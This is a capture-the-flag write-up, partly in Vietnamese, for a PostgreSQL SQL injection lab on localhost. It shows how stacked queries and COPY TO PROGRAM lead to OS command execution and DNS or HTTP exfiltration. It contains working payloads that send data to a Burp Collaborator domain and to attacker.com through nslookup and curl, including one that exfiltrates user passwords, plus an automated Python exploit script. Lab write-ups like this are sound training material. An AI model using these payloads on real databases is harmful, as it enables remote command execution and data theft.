# SQLi-041: PostgreSQL OOB DNS via COPY TO PROGRAM - Writeup

## Flag: `FLAG{postgres_copy_to_program_dns}`

---

## 🔍 Bước 1: DETECT

```bash
# Response luôn giống nhau
curl "http://localhost:5041/user?id=1"

# Test stacked queries với pg_sleep
time curl "http://localhost:5041/user?id=1;SELECT pg_sleep(3)--"
# ~3s delay → Stacked queries work!
```

---

## 🎯 Bước 2: IDENTIFY

Frontend hints:
- PostgreSQL 15
- User: postgres (superuser)
- Stacked Queries: ON

→ COPY TO PROGRAM available!

---

## 🔧 Bước 3: ENUMERATE với COPY TO PROGRAM

### Test OOB

**Basic test:**
```sql
1;COPY (SELECT '') TO PROGRAM 'nslookup test.xxxxx.burpcollaborator.net'--
```

**URL:**
```
http://localhost:5041/user?id=1;COPY%20(SELECT%20'')%20TO%20PROGRAM%20'nslookup%20test.xxxxx.burpcollaborator.net'--
```

**Collaborator:** DNS lookup received! ✅

### Extract database name

```sql
1;COPY (SELECT current_database()) TO PROGRAM 'xargs -I{} nslookup {}.xxxxx.burpcollaborator.net'--
```

**Alternative với curl + shell substitution:**
```sql
1;COPY (SELECT current_database()) TO PROGRAM 'xargs -I{} sh -c "nslookup {}.xxxxx.burpcollaborator.net"'--
```

**DNS Lookup:** `userdb.xxxxx.burpcollaborator.net`

---

## 📤 Bước 4: EXTRACT

### Enumerate tables

```sql
1;COPY (SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1) TO PROGRAM 'xargs -I{} nslookup {}.xxxxx.burpcollaborator.net'--
```

**Tables found:** admin_creds, flags, users

### Extract flag

```sql
1;COPY (SELECT value FROM flags LIMIT 1) TO PROGRAM 'xargs -I{} nslookup {}.xxxxx.burpcollaborator.net'--
```

---

## 🏆 Bước 5-6: EXFILTRATE

**Final payload:**
```sql
1;COPY (SELECT value FROM flags WHERE name='sqli_041') TO PROGRAM 'xargs -I{} nslookup {}.xxxxx.burpcollaborator.net'--
```

**DNS Lookup:**
```
FLAG{postgres_copy_to_program_dns}.xxxxx.burpcollaborator.net
```

🎉 **FLAG:** `FLAG{postgres_copy_to_program_dns}`

---

## 🤖 Automated Exploit

```python
#!/usr/bin/env python3
import requests
import argparse
import urllib.parse

def send_oob(url, query, oob_domain):
    # COPY TO PROGRAM với xargs để embed data trong DNS
    payload = f"1;COPY ({query}) TO PROGRAM 'xargs -I{{}} nslookup {{}}.{oob_domain}'--"
    try:
        requests.get(url, params={"id": payload}, timeout=10)
        return True
    except:
        return True

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://localhost:5041/user")
    parser.add_argument("--oob", required=True, help="OOB domain")
    args = parser.parse_args()
    
    print(f"[*] Target: {args.target}")
    print(f"[*] OOB: {args.oob}")
    
    print("\n[1] Extracting database...")
    send_oob(args.target, "SELECT current_database()", args.oob)
    
    print("[2] Extracting tables...")
    send_oob(args.target, "SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1", args.oob)
    
    print("[3] Extracting flag...")
    send_oob(args.target, "SELECT value FROM flags WHERE name='sqli_041'", args.oob)
    
    print(f"\n[*] Check DNS for: <data>.{args.oob}")
    print("[*] Expected: FLAG{postgres_copy_to_program_dns}")

if __name__ == "__main__":
    main()
```

---

## 🔗 Key Techniques

```sql
-- Basic COPY TO PROGRAM OOB
1;COPY (SELECT '') TO PROGRAM 'nslookup test.attacker.com'--

-- With data exfiltration using xargs
1;COPY (SELECT current_database()) TO PROGRAM 'xargs -I{} nslookup {}.attacker.com'--

-- Alternative: curl for HTTP exfil
1;COPY (SELECT password FROM users LIMIT 1) TO PROGRAM 'xargs -I{} curl http://attacker.com/?d={}'--

-- Using shell substitution
1;COPY (SELECT 'test') TO PROGRAM 'sh -c "nslookup $(cat).attacker.com"'--
```

---

## 📊 Summary

| Step | Action | Result |
|------|--------|--------|
| DETECT | Test stacked queries | pg_sleep works |
| IDENTIFY | PostgreSQL superuser | COPY TO PROGRAM available |
| ENUMERATE | OOB via nslookup | Found flags table |
| EXFILTRATE | Extract flag | FLAG{postgres_copy_to_program_dns} |

---

## ⚠️ Requirements

- PostgreSQL superuser (postgres)
- Stacked queries support
- `nslookup` hoặc `dig` available trên server
